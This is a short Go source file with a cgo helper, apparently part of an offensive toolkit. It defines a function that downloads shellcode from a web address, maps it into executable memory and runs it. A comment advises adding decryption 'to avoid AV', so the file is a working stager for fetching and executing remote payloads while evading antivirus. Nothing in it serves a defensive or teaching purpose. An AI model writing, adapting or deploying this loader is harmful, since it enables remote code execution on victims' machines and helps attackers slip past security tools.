package exec

/*
int call(char *code) {
    int (*ret)() = (int(*)())code;
    ret();
}
*/
import "C"
import (
	"bytes"
	"net/http"
	"time"
	"unsafe"

	"github.com/edsrzf/mmap-go"
)

//This is a handy function for executing shellcode from a web address. Edit to decrypt as needed to avoid AV.

func ExecShellcodeFromWeb(addr string) {

	//buf := ""
	r, e := http.Get(addr)
	if e != nil {
		panic(e)
	}
	defer r.Body.Close()
	buff := &bytes.Buffer{}
	buff.ReadFrom(r.Body)
	body := buff.Bytes()

	shellcode := []byte(body)

	b, e := mmap.MapRegion(nil, len(shellcode), mmap.EXEC|mmap.RDWR, mmap.ANON, int64(0))
	//b, e := syscall.Mmap(0, 0, len(shellcode), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANON)
	if e != nil {
		panic(e)
	}
	copy(b, shellcode)
	C.call((*C.char)(unsafe.Pointer(&b[0])))
	time.Sleep(5)
}
